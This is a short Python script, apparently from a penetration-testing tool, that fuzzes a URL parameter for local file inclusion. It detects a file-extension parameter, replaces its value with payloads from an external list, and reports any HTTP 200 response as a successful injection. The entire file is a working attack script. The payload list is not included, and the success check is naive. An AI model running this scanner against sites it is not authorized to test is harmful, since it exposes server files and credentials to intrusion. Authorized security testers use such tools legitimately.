import requests
import re
from sys import platform

# extentionFile = open("LFI_fies/extensions.txt", "r")
# lfiPayloads = open("LFI_fies/payloads.txt", "r", encoding='utf-8')


def testExtention(url):
    place_file = r"LFI_fies/extensions.txt"
    if platform == "linux" or platform == "linux2":
        place_file = r"LFI_fies/extensions.txt"
    else:
        place_file = r"LFI_fies\extensions.txt"

    with open(place_file, "r") as extentionFile:
        for extension in extentionFile:
            ext = re.compile(".*{}".format(extension.strip()))
            if ext.search(url):
                return True, extension
        return False, ""


def LFIinj(url, extension):
    place_file = r"LFI_fies/payloads.txt"
    if platform == "linux" or platform == "linux2":
        place_file = r"LFI_fies/payloads.txt"
    else:
        place_file = r"LFI_fies\payloads.txt"
    pass_payload = ""
    responses = []
    fails = []
    counter = 1
    with open(place_file, "r") as lfiPayloads:
        for payload in lfiPayloads:
            newUrl = re.sub('=.*{}'.format(extension.strip()), '=', url)
            newUrl = newUrl + payload
            response = requests.get(newUrl.strip())
            if response.status_code == 200:
                responses.append(response.text)
                print(response.text)
                print("{} :[+] FOUNDED using : {}".format(counter, payload))
                pass_payload = f"[+] FOUNDED using : {payload}"
                break
            else:
                print("{} :[-] FAILED : {} ".format(counter, payload))
                fails.append(f"{counter} :[-] FAILED : {payload}")
            counter = counter + 1
    return responses, pass_payload, fails


if __name__ == "__main__":
    url = input("Enter url to LFI: ")
    # test if url contain parameter with files extensions
    isHas, extention = testExtention(url)
    if isHas:
        print("URL querying file with extention {}".format(extention))
        print("Start LFI injection")
        successPayloads = LFIinj(url, extention)
    else:
        print("[-] Must be querying file from server ")

